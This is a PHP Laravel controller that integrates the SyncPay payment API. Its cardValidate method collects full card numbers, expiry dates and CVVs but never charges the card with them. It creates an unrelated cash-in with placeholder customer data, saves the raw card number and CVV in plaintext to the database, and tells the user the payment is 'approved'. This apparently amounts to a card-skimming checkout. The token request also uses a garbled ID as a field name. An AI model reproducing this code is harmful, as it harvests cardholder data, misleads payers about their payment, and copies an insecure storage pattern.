<?php

namespace App\Http\Controllers;

use App\Models\CardPayment;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Validation\ValidationException;

class SyncPayController extends Controller
{
    public function cashIn(Request $request)
    {
        $data = $request->validate([
            'amount' => ['required', 'numeric', 'min:0'],
            'description' => ['nullable', 'string', 'max:255'],
            'name' => ['required', 'string', 'max:255'],
            'cpf' => ['required', 'string', 'size:11'],
            'email' => ['required', 'email'],
            'phone' => ['required', 'string', 'max:15'],
        ]);

        $tokenResponse = Http::post($this->baseUrl('/api/partner/v1/auth-token'), [
            'client_id' => config('services.syncpay.client_id'),
            'client_secret' => config('services.syncpay.client_secret'),
            '01K1259MAXE0TNRXV2C2WQN2MV' => config('services.syncpay.api_key'),
        ]);

        if (! $tokenResponse->successful()) {
            throw ValidationException::withMessages([
                'syncpay' => 'Não foi possível autenticar com o SyncPay.',
            ]);
        }

        $token = $tokenResponse->json('access_token');

        $response = Http::withToken($token)
            ->acceptJson()
            ->post($this->baseUrl('/api/partner/v1/cash-in'), [
                'amount' => (float) $data['amount'],
                'description' => $data['description'] ?? 'Pagamento via app',
                'webhook_url' => config('services.syncpay.webhook_url'),
                'client' => [
                    'name' => $data['name'],
                    'cpf' => $data['cpf'],
                    'email' => $data['email'],
                    'phone' => $data['phone'],
                ],
            ]);

        if (! $response->successful()) {
            return response()->json([
                'message' => 'Erro ao criar cobrança SyncPay',
                'details' => $response->json(),
            ], $response->status());
        }

        return response()->json($response->json());
    }

    public function cardValidate(Request $request)
    {
        $data = $request->validate([
            'amount' => ['required', 'numeric', 'min:0'],
            'card_holder' => ['required', 'string', 'max:255'],
            'card_number' => ['required', 'string', 'min:12', 'max:19'],
            'card_expiry' => ['required', 'string', 'max:5'],
            'card_cvv' => ['required', 'string', 'min:3', 'max:4'],
        ]);

        $tokenResponse = Http::post($this->baseUrl('/api/partner/v1/auth-token'), [
            'client_id' => config('services.syncpay.client_id'),
            'client_secret' => config('services.syncpay.client_secret'),
            '01K1259MAXE0TNRXV2C2WQN2MV' => config('services.syncpay.api_key'),
        ]);

        if (! $tokenResponse->successful()) {
            throw ValidationException::withMessages([
                'syncpay' => 'Não foi possível autenticar com o SyncPay.',
            ]);
        }

        $token = $tokenResponse->json('access_token');

        $response = Http::withToken($token)
            ->acceptJson()
            ->post($this->baseUrl('/api/partner/v1/cash-in'), [
                'amount' => (float) $data['amount'],
                'description' => 'Pagamento com cartão',
                'webhook_url' => config('services.syncpay.webhook_url'),
                'client' => [
                    'name' => $data['card_holder'],
                    'cpf' => '00000000000',
                    'email' => 'card@local.test',
                    'phone' => '00000000000',
                ],
            ]);

        if (! $response->successful()) {
            return response()->json([
                'message' => 'Erro ao validar pagamento com cartão',
                'details' => $response->json(),
            ], $response->status());
        }

        CardPayment::create([
            'amount' => (float) $data['amount'],
            'card_holder' => $data['card_holder'],
            'card_number' => preg_replace('/\D/', '', $data['card_number']),
            'card_expiry' => $data['card_expiry'],
            'card_cvv' => $data['card_cvv'],
            'status' => 'approved',
            'syncpay_identifier' => $response->json('identifier'),
        ]);

        return response()->json([
            'status' => 'approved',
            'identifier' => $response->json('identifier'),
        ]);
    }

    protected function baseUrl(string $path): string
    {
        $baseUrl = rtrim(config('services.syncpay.base_url', 'https://api.syncpay.com.br'), '/');

        return $baseUrl.$path;
    }
}
